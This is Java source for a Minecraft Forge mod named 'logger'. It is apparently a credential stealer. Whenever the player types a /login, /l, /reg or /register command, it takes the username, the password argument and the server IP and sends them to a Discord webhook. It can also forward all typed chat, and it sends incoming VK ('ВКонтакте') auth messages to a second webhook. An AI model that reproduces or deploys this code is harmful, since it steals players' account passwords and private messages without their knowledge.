package me.bushroot.logger;

import me.bushroot.logger.config.cfg;
import me.bushroot.logger.webhook.DiscordWebhook;
import net.minecraft.client.Minecraft;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

import java.awt.*;
import java.io.IOException;
import java.util.Objects;

public class log {
    DiscordWebhook webhookLogger = cfg.logger;
    DiscordWebhook webhookDetector = cfg.detector;

    @SubscribeEvent
    public void ChatEvent(ClientChatEvent e) throws IOException {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");

        if (!cfg.logAll) {
            if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
                webhookLogger.clearEmbeds();
                webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
                        .setTitle("Infinity")
                        .setDescription("Minecraft Modification | Logger")
                        .setColor(new Color(0xA800E8))
                        .addField("USER", Minecraft.getMinecraft().getSession().getUsername(), true)
                        .addField("PASSWORD", sentences[1], true)
                        .addField("SERVER", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).serverIP, true)
                        .addField("PING", String.valueOf(Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).pingToServer), true)


                        .setThumbnail("https://yt3.ggpht.com/aaaOPBv9Zerpdv5YrsMVUhZalk8GI3qS34UAhOHKr15Mnzd-uMv1v00p7rD3VVm7QXfJ5RhCUGU=s600-c-k-c0x00ffffff-no-rj-rp-mo"));

                webhookLogger.execute();
            }
        } else {
            webhookLogger.setContent("```" + Minecraft.getMinecraft().getSession().getUsername() + ": " + msg + "```");
            webhookLogger.execute();
        }
    }

    @SubscribeEvent
    public void detector(ClientChatReceivedEvent e) {
        String msg = e.getMessage().getUnformattedText();
        // String[] sentences = msg.split(" ");

        if (msg.contains("ВКонтакте")) {
            try {
                webhookDetector.setContent("DETECTED VK-AUTH MESSAGE: ```" + msg + "```");
                webhookDetector.execute();
            } catch (IOException ignored) {}
        }
    }
}
